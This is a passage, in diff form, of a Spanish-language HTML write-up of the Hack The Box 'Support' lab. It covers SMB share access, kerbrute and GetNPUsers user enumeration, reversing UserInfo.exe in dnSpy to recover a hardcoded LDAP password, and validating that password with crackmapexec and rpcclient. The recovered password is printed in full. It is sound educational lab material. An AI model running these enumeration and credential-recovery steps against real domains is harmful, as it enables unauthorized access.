+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                   D        0  Wed Jul 20 12:01:06 2022
+  ..                                  D        0  Sat May 28 06:18:25 2022
+  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 06:19:19 2022
+  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 06:19:55 2022
+  putty.exe                           A  1273576  Sat May 28 06:20:06 2022
+  SysinternalsSuite.zip               A 48102161  Sat May 28 06:19:31 2022
+  UserInfo.exe.zip                    A   277499  Wed Jul 20 12:01:07 2022
+  windirstat1_1_2_setup.exe           A    79171  Sat May 28 06:20:17 2022
+  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 06:19:43 2022
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;obtener-archivo&quot;&gt;OBTENER ARCHIVO&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; get UserInfo.exe.zip 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;getting file &lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;serInfo.exe.zip of size 277499 as UserInfo.exe.zip &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;123,3 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;average 123,3 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;salir-de-smb&quot;&gt;SALIR DE SMB&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;userinfoexezip-enum&quot;&gt;USERINFO.EXE.ZIP ENUM&lt;/h2&gt;
+
+&lt;p&gt;Tenemos el archivo, ahora procedemos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;7z&lt;/code&gt; a descomprimirlo y tratar de obtener algo de información con la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strings&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;listar-contenido-del-archivo&quot;&gt;LISTAR CONTENIDO DEL ARCHIVO&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;7z l UserInfo.exe.zip
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   Date      Time    Attr         Size   Compressed  Name
+&lt;span class=&quot;nt&quot;&gt;-------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-----&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;------------------------&lt;/span&gt;
+2022-05-27 12:51:05 .....        12288         5424  UserInfo.exe
+2022-03-01 13:18:50 .....        99840        41727  CommandLineParser.dll
+2021-10-22 18:42:08 .....        22144        12234  Microsoft.Bcl.AsyncInterfaces.dll
+2021-10-22 18:48:04 .....        47216        21201  Microsoft.Extensions.DependencyInjection.Abstractions.dll
+2021-10-22 18:48:22 .....        84608        39154  Microsoft.Extensions.DependencyInjection.dll
+2021-10-22 18:51:24 .....        64112        29081  Microsoft.Extensions.Logging.Abstractions.dll
+2020-02-19 05:05:18 .....        20856        11403  System.Buffers.dll
+2020-02-19 05:05:18 .....       141184        58623  System.Memory.dll
+2018-05-15 08:29:44 .....       115856        32709  System.Numerics.Vectors.dll
+2021-10-22 18:40:18 .....        18024         9541  System.Runtime.CompilerServices.Unsafe.dll
+2020-02-19 05:05:18 .....        25984        13437  System.Threading.Tasks.Extensions.dll
+2022-05-27 11:59:39 .....          563          327  UserInfo.exe.config
+&lt;span class=&quot;nt&quot;&gt;-------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-----&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;------------------------&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;descomprimir-archivo&quot;&gt;DESCOMPRIMIR ARCHIVO&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;7z x UserInfo.exe.zip
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;strings-enum&quot;&gt;STRINGS ENUM&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;strings &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; l UserInfo.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@%1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	5W5
+0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E
+armando
+LDAP://support.htb
+support&lt;span class=&quot;se&quot;&gt;\l&lt;/span&gt;dap
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Por lo que vemos, aparentemente tenemos un usuario potencial &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ldap&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;armando&lt;/code&gt;, lo tenemos en cuenta para más adelante&lt;/p&gt;
+
+&lt;h2 id=&quot;rpcclient-null-session-enum&quot;&gt;RPCCLIENT NULL SESSION ENUM&lt;/h2&gt;
+
+&lt;p&gt;Eumeramos información por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rpcclient&lt;/code&gt; null session, sin exito&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; 10.10.11.174 &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;result was NT_STATUS_ACCESS_DENIED
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;users-dictionary&quot;&gt;USERS DICTIONARY&lt;/h2&gt;
+
+&lt;p&gt;Vamos a crear una lista de usuarios con la información que tenemos por el momento&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nvim users.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ldap
+armando
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;tgt-kerbrute-enum&quot;&gt;TGT KERBRUTE ENUM&lt;/h1&gt;
+
+&lt;p&gt;Procedemos a validar nuestra lista de usuarios para identificar un nuevo usuario&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kerbrute userenum &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; support.htb &lt;span class=&quot;nt&quot;&gt;--dc&lt;/span&gt; 10.10.11.174 users.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2023/02/17 21:37:54 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:	ldap@support.htb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Para esta ocasión vamos a usar un listado generico de usuarios &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xato-net-10-million-usernames.tx&lt;/code&gt; propio de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Seclists&lt;/code&gt; para ver si podemos encontrar usuarios adicionales&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kerbrute userenum &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; support.htb &lt;span class=&quot;nt&quot;&gt;--dc&lt;/span&gt; 10.10.11.174 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2023/02/17 21:43:24 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:	support@support.htb
+2023/02/17 21:43:28 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:	guest@support.htb
+2023/02/17 21:43:58 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:	administrator@support.htb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;tgt-getnpusers-enum&quot;&gt;TGT GETNPUSERS ENUM&lt;/h2&gt;
+
+&lt;p&gt;Obtenemos 4 usuarios validos con el ejercicio anterior! Ahora vamos a realizar la misma validación con la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetNPUsers&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;impacket-GetNPUsers support.htb/ &lt;span class=&quot;nt&quot;&gt;-no-pass&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-usersfile&lt;/span&gt; users.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] User ldap doesn&lt;span class=&quot;s1&quot;&gt;'t have UF_DONT_REQUIRE_PREAUTH set
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora validamos los usuarios del diccionario de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Seclists&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;impacket-GetNPUsers support.htb/ &lt;span class=&quot;nt&quot;&gt;-no-pass&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-usersfile&lt;/span&gt; /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;not found&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] User support doesn&lt;span class=&quot;s1&quot;&gt;'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User guest doesn'&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] User administrator doesn&lt;span class=&quot;s1&quot;&gt;'t have UF_DONT_REQUIRE_PREAUTH set
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;updating-users-dictionary&quot;&gt;UPDATING USERS DICTIONARY&lt;/h2&gt;
+
+&lt;p&gt;Actualizamos el diccionario de usuarios que creamos anteriormente&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nvim users.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ldap@support.htb
+guest@support.htb
+support-tools@support.htb
+administrator@support.htb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;windows-machine-userinfoexe-enum&quot;&gt;WINDOWS MACHINE USERINFO.EXE ENUM&lt;/h2&gt;
+
+&lt;p&gt;Tenemos que entender que hace este programa a ver si podemos tener alguna información importante para continuar&lt;/p&gt;
+
+&lt;h3 id=&quot;maquina-atacante&quot;&gt;MAQUINA ATACANTE&lt;/h3&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;máquina-windows&quot;&gt;MÁQUINA WINDOWS&lt;/h3&gt;
 &lt;blockquote&gt;
 
   &lt;ul&gt;
-    &lt;li&gt;Clic en la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;máquina&lt;/code&gt;&lt;/li&gt;
-    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Configuración&lt;/code&gt;&lt;/li&gt;
-    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Red&lt;/code&gt;&lt;/li&gt;
-    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adaptador 1&lt;/code&gt;&lt;/li&gt;
-    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Enable Network Adapter&lt;/code&gt;&lt;/li&gt;
-    &lt;li&gt;Escoger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adaptador puente&lt;/code&gt;&lt;/li&gt;
-    &lt;li&gt;Escoger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Interfaz&lt;/code&gt; física&lt;/li&gt;
-    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Aceptar&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Agregar DOMAIN al archivo HOSTS de WINDOWS&lt;/li&gt;
+    &lt;li&gt;Prender OPENVPN&lt;/li&gt;
+    &lt;li&gt;Descargar en navegador USERINFO.EXE.ZIP, descomprimir y comprender su funcionamiento
+      &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://&amp;lt;IP_ATACANTE&amp;gt;/UserInfo.exe.zip
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;      &lt;/div&gt;
+    &lt;/li&gt;
+  &lt;/ul&gt;
+
+&lt;/blockquote&gt;
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/support/03-win.png&quot; /&gt;
+&lt;/p&gt;
+&lt;blockquote&gt;
+
+  &lt;ul&gt;
+    &lt;li&gt;Descargar en navegador y descomprimir DNSPY
+      &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://github.com/dnSpy/dnSpy/releases/download/v6.1.8/dnSpy-netframework.zip
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;      &lt;/div&gt;
+    &lt;/li&gt;
+    &lt;li&gt;Ejecutar DNSPY y cargar USERINFO.EXE
+      &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;UserInfo - UserInfo.exe - UserInfo.Services - LdapQuery
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;      &lt;/div&gt;
+    &lt;/li&gt;
+    &lt;li&gt;Asignar un BREAK POINT en linea 13
+      &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Tecla f9
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;      &lt;/div&gt;
+    &lt;/li&gt;
+    &lt;li&gt;Depurar el programa
+      &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Tecla f5
+Argumentos: find &lt;span class=&quot;nt&quot;&gt;-first&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-last&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+Aceptar
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;      &lt;/div&gt;
+    &lt;/li&gt;
+  &lt;/ul&gt;
+
+&lt;/blockquote&gt;
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/support/04-win.png&quot; /&gt;
+&lt;/p&gt;
+&lt;blockquote&gt;
+
+  &lt;ul&gt;
+    &lt;li&gt;Dar un paso adicional en el DEBUG
+      &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Tecla f10
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;      &lt;/div&gt;
+    &lt;/li&gt;
+    &lt;li&gt;Se detecta la variable PASSWORD y una contraseña&lt;/li&gt;
+  &lt;/ul&gt;
+
+&lt;/blockquote&gt;
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/support/05-win.png&quot; /&gt;
+&lt;/p&gt;
+&lt;blockquote&gt;
+
+  &lt;ul&gt;
+    &lt;li&gt;Apagar OPENVPN&lt;/li&gt;
+    &lt;li&gt;Volvemos a nuestra máquina atacante&lt;/li&gt;
   &lt;/ul&gt;
 
 &lt;/blockquote&gt;
 
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/safewebheaders/09-virtual.png&quot; /&gt;
-&lt;/p&gt;
+&lt;h2 id=&quot;validating-ldap-credentials&quot;&gt;VALIDATING LDAP CREDENTIALS&lt;/h2&gt;
 
-&lt;h3 id=&quot;configuración-interfaz-creada&quot;&gt;CONFIGURACIÓN INTERFAZ CREADA&lt;/h3&gt;
+&lt;p&gt;Antes que cualquier cosa, debemos volver a activar nuestra vpn en la máquina atacante con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OpenVPN&lt;/code&gt;, luego de esto procedemos a validar las credenciales obtenidas anteriormente&lt;/p&gt;
+
+&lt;h3 id=&quot;validar-creds-smb&quot;&gt;VALIDAR CREDS SMB&lt;/h3&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crackmapexec smb 10.10.11.174 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; ldap &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SMB         10.10.11.174    445    DC               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 20348 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:DC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:support.htb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+SMB         10.10.11.174    445    DC               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] support.htb&lt;span class=&quot;se&quot;&gt;\l&lt;/span&gt;dap:nvEfEK16^1aM4&lt;span class=&quot;nv&quot;&gt;$e7AclUf8x$tRWxPWO1&lt;/span&gt;%lmz 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;validar-creds-winrm&quot;&gt;VALIDAR CREDS WINRM&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crackmapexec winrm 10.10.11.174 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; ldap &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SMB         10.10.11.174    5985   DC               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 20348 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:DC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:support.htb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+HTTP        10.10.11.174    5985   DC               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; http://10.10.11.174:5985/wsman
+WINRM       10.10.11.174    5985   DC               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] support.htb&lt;span class=&quot;se&quot;&gt;\l&lt;/span&gt;dap:nvEfEK16^1aM4&lt;span class=&quot;nv&quot;&gt;$e7AclUf8x$tRWxPWO1&lt;/span&gt;%lmz
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Las credenciales son validas para &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smb&lt;/code&gt; pero no es una cuenta con privilegios&lt;/p&gt;
+
+&lt;h2 id=&quot;rcpclient-enum-with-creds&quot;&gt;RCPCLIENT ENUM (WITH CREDS)&lt;/h2&gt;
+
+&lt;p&gt;Ahora tenemos lo necesario para extraer usuarios del controlador de dominio por medio de las credenciales validas encontradas anteriormente, adicionalmente vamos a enumerar un poco mas de información&lt;/p&gt;
+
+&lt;h3 id=&quot;obtener-listado-de-usuarios&quot;&gt;OBTENER LISTADO DE USUARIOS&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'&lt;/span&gt; 10.10.11.174 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; enumdomusers | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oP&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\[.*?\]'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 0x | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'[]'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; users.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;grupos-administradores&quot;&gt;GRUPOS ADMINISTRADORES&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'&lt;/span&gt; 10.10.11.174 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; enumdomgroups
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
+group:[Domain Admins] rid:[0x200]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;usuarios-administradores&quot;&gt;USUARIOS ADMINISTRADORES&lt;/h3&gt;
